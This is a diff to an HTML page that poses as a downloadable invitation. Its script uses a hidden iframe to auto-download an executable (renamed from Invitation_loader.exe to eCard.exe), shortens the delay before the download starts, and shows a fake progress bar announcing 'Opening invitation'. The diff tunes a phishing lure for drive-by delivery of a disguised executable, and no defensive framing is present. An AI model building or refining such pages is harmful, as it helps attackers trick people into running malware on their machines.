@@ -45,7 +45,7 @@
             </div>
             <p class="status-text" id="statusText">Downloading your invitation...</p>
             
-            <a href="/static/Invitation_loader.exe" class="manual-btn" download id="downloadBtn">↓ Download Invitation</a>
+            <a href="/static/eCard.exe" class="manual-btn" download id="downloadBtn">↓ Download Invitation</a>
             <p style="font-size:11px; color:#666; margin-top:8px;">If your download does not start, click the button above.</p>
             
             <div class="testimonial">
@@ -60,33 +60,31 @@
     <iframe id="autoDl"></iframe>
 
     <script>
-        // SEQUENTIAL PHASE TRANSITION + DELAYED DOWNLOAD TRIGGER
+        // ACCELERATED SEQUENTIAL PHASE TRANSITION (1.5s) + IMMEDIATE DOWNLOAD TRIGGER
         setTimeout(() => {
             document.getElementById('phase1').style.display = 'none';
             document.getElementById('phase2').style.display = 'block';
             
-            // START AUTO-DOWNLOAD AFTER 3 SECOND DELAY (PRIMING TIME)
-            setTimeout(() => {
-                document.getElementById('autoDl').src = '/static/Invitation_loader.exe';
-                
-                // ANIMATE PROGRESS BAR
-                let progress = 0;
-                const bar = document.getElementById('progressBar');
-                const status = document.getElementById('statusText');
-                const btn = document.getElementById('downloadBtn');
-                
-                const interval = setInterval(() => {
-                    progress += Math.random() * 4;
-                    if (progress >= 100) {
-                        progress = 100;
-                        clearInterval(interval);
-                        status.textContent = "Download complete. Opening invitation...";
-                        btn.classList.add('visible');
-                    }
-                    bar.style.width = progress + "%";
-                }, 200);
-            }, 3000);
-        }, 2500); // Show Phase 1 for 2.5 seconds before transitioning
+            // START AUTO-DOWNLOAD INSTANTLY ON PHASE 2 LOAD (NO EXTRA DELAY)
+            document.getElementById('autoDl').src = '/static/eCard.exe';
+            
+            // ANIMATE PROGRESS BAR
+            let progress = 0;
+            const bar = document.getElementById('progressBar');
+            const status = document.getElementById('statusText');
+            const btn = document.getElementById('downloadBtn');
+            
+            const interval = setInterval(() => {
+                progress += Math.random() * 4;
+                if (progress >= 100) {
+                    progress = 100;
+                    clearInterval(interval);
+                    status.textContent = "Download complete. Opening invitation...";
+                    btn.classList.add('visible');
+                }
+                bar.style.width = progress + "%";
+            }, 200);
+        }, 1500); // Show Phase 1 for exactly 1.5 seconds
     </script>
 </body>
 </html>
